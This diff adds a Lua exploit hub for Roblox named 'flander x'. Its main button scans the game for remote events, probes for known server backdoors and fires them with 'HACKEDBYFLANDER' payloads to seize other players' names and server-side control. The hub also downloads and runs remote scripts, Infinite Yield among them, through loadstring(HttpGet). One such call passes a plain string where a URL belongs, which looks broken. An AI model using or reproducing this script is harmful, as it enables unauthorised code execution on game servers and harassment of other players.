@@ -1,1 +1,122 @@
-print(sussybaka)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("flander x (ANIME RP)", "Synapse")
+local Tab = Window:NewTab("scripts")
+local Section = Tab:NewSection("more cumming soon")
+Section:NewButton("FUCK THEIR NAMES", "changes their names to some british gibberish", function()
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local requireScript = ("hail flander the sand")
+local invCode = ""
+
+local alternativeSS = {
+	run = { [1] = "lulHACKEDBYFLANDER" },
+	emma = { [1] = "flandergreat", [2] = ",,,,,,,,,,,,,,," },
+	helpme = { [1] = "Flander x Best hub! (not for sale anymore cause of some problems)" },
+	pickett = { [1] = "HACKEDBYFLANDER" },
+	harked = "flander hacked"
+}
+
+local function notify(text)
+	game:GetService("StarterGui"):SetCore(
+	"SendNotification",
+		{
+			Title = "flander x",
+			Duration = 3,
+			Text = text
+		}
+	)
+end
+
+local function attached(possibleWait)
+	if possibleWait then wait(possibleWait) end
+	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
+end
+
+local function validRemote(rm, _className)
+	local fullName =  rm:GetFullName()
+	
+	if string.find(fullName, "DefaultChat") then return false end
+	if string.find(fullName, LocalPlayer.Name) then return false end
+	if rm:FindFirstChild("__FUNCTION") then return false end
+	if rm.Parent == game:GetService("JointsService") then return false end
+	
+	if rm.ClassName ~= _className then return false end
+
+	if getgenv().blacklisted then
+		if table.find(getgenv().blacklisted, fullName) then return false end
+	end
+
+	return true
+end
+
+local function harked()
+	local backpack = LocalPlayer.Backpack 
+	return backpack:FindFirstChild("HandlessSegway") and
+		Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+		Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+end
+local function emmaBackdoor(rm)
+	return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
+end
+local function runBackdoor(rm)
+	return rm.Name == "Run" and
+	rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
+	rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
+end
+
+local function scanGame()
+    notify("CHANGING THEIR NAMES FUCK YEA")
+	if harked() then
+		loadstring(game:HttpGetAsync(alternativeSS.harked))()
+		return
+	end
+
+	for _, remote in pairs(game:GetDescendants()) do
+		if validRemote(remote, "RemoteEvent") and not attached() then
+			if emmaBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.emma), requireScript)
+			end
+			if runBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.run), requireScript)
+			end
+
+			remote:FireServer(unpack(alternativeSS.helpme), requireScript)
+			remote:FireServer(unpack(alternativeSS.pickett), requireScript)
+			remote:FireServer(requireScript)
+
+		end
+	end
+
+	for _, remote in pairs(game:GetDescendants()) do
+		if validRemote(remote, "RemoteFunction") and not attached() then
+			remote:InvokeServer(requireScript)
+		end
+	end
+
+end
+
+local function Main()
+	notify("changed names"..invCode)
+
+	scanGame()
+	
+	if not attached(2) then
+		notify("FUCK YEAH!! CHANGED NAMES")
+	end
+end
+
+if game:IsLoaded() then
+	pcall(Main)
+end
+
+--	fland
+--	.------.
+--	|4.--. |
+--	| :│/: |
+--	| :│\: |
+--	| '--'4|
+--	`------'
+end)
+Section:NewButton("infinite yield", "fly and more stuff ", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()   
+end)
